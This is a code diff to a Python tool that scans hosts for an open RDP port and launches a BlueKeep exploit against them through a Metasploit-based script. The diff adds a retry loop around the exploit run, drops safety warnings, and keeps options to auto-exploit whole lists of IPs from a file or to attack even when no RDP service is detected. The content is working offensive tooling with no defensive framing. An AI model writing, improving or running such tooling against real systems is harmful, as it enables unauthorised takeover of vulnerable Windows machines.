@@ -10,50 +10,16 @@ import subprocess
 from pathlib import Path
 
 def check_rdp_port(host, port=3389, timeout=3):
-    """Check if the target host has the RDP port open and is running RDP."""
+    """Check if the target host has the RDP port open."""
     try:
-        print(f"[*] Checking RDP service on {host}:{port}...")
-        
-        # First: basic port check
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(timeout)
         result = sock.connect_ex((host, port))
+        sock.close()
         
-        if result != 0:
-            print(f"[-] Port {port} is closed on {host}")
-            return False
-            
-        print(f"[+] Port {port} is open on {host}")
-        
-        # Second: send a valid RDP negotiation request
-        rdp_probe = bytes.fromhex("0300000b06e00000000000")
-        try:
-            new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            new_sock.settimeout(timeout)
-            new_sock.connect((host, port))
-            new_sock.send(rdp_probe)
-            
-            response = new_sock.recv(1024)
-            new_sock.close()
-            
-            if len(response) > 0 and response[0:1] == b'\x03':  # RDP protocol signature check
-                print(f"[+] RDP service confirmed on {host}:{port}")
-                return True
-            else:
-                print(f"[-] Port {port} is open but does not appear to be RDP")
-                print(f"[*] Response: {response.hex()}")
-                # Even though it doesn't seem to be RDP, we'll return True to continue with testing
-                return True
-                
-        except socket.timeout:
-            print(f"[-] Timeout while waiting for RDP response from {host}")
-            return False
-        except Exception as e:
-            print(f"[-] Error during RDP check: {e}")
-            return False
-            
+        return result == 0
     except socket.error as e:
-        print(f"[-] Socket error when checking {host}: {e}")
+        print(f"[-] Error checking target {host}: {e}")
         return False
 
 def detect_windows_version(target_ip, port=3389):
@@ -190,7 +156,7 @@ def run_metasploit_scanner(target_ip, port=3389, auto_exploit=False):
         print(f"[-] Error running scanner: {e}")
         return None
 
-def run_exploit(target_ip, port=3389, target_id=None):
+def run_exploit(target_ip, port=3389, target_id=None, max_retries=3):
     """Run the BlueKeep exploit against the target."""
     print(f"[*] Executing exploit against {target_ip}:{port}")
     
@@ -204,14 +170,37 @@ def run_exploit(target_ip, port=3389, target_id=None):
         if target_id is None:
             target_id = detect_windows_version(target_ip, port)
         
-        # Run the exploit
-        cmd = ["python3", "metasploit_bluekeep.py", "-i", target_ip, "-l", lhost, 
-               "-t", str(target_id), "-p", str(port), "-f"]
-        subprocess.run(cmd)
+        # Run the exploit with retry mechanism
+        retry_count = 0
+        while retry_count < max_retries:
+            print(f"[*] Exploit attempt {retry_count + 1} of {max_retries}")
+            
+            # Run the exploit
+            cmd = ["python3", "metasploit_bluekeep.py", "-i", target_ip, "-l", lhost, 
+                  "-t", str(target_id), "-p", str(port), "-f"]
+            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            
+            # Check for connection reset error
+            if "Connection reset by peer" in process.stdout or "Connection reset by peer" in process.stderr:
+                print(f"[!] Connection reset detected. This is a known issue with BlueKeep exploitation.")
+                print(f"[!] See: https://github.com/rapid7/metasploit-framework/issues/13732")
+                
+                retry_count += 1
+                if retry_count < max_retries:
+                    print(f"[*] Waiting 30 seconds before retry...")
+                    time.sleep(30)
+                else:
+                    print(f"[-] Maximum retry attempts reached. Exploitation failed.")
+            else:
+                # If no connection reset, break out of retry loop
+                break
+            
     except Exception as e:
         print(f"[-] Error running exploit: {e}")
         print("[*] You can manually exploit this target with:")
         print(f"    python3 metasploit_bluekeep.py -i {target_ip} -t 2")
+        print("[!] Note: If you encounter 'Connection reset by peer' errors, see:")
+        print("    https://github.com/rapid7/metasploit-framework/issues/13732")
 
 def scan_from_file(filename, port=3389, auto_exploit=False):
     """Scan multiple IPs from a file."""
@@ -281,17 +270,13 @@ def main():
         if args.ip:
             # Scan single IP
             if check_rdp_port(args.ip, args.port):
-                print(f"[+] RDP service detected on {args.ip}:{args.port}")
+                print(f"[+] RDP port open on {args.ip}:{args.port}")
                 run_metasploit_scanner(args.ip, args.port, args.auto_exploit or args.exploit_all)
             else:
                 print(f"[-] No RDP service detected on {args.ip}:{args.port}")
                 if args.exploit_all:
                     print("[*] Exploit-all flag set, attempting exploit anyway...")
-                    print("[!] WARNING: Exploit may fail due to no RDP service")
                     run_exploit(args.ip, args.port)
-                else:
-                    print("[*] Suggest running check_rdp_detailed.py for more information")
-                    print(f"    python3 check_rdp_detailed.py -i {args.ip} -p {args.port}")
         else:
             # Scan multiple IPs from file
             scan_from_file(args.file, args.port, args.auto_exploit or args.exploit_all)
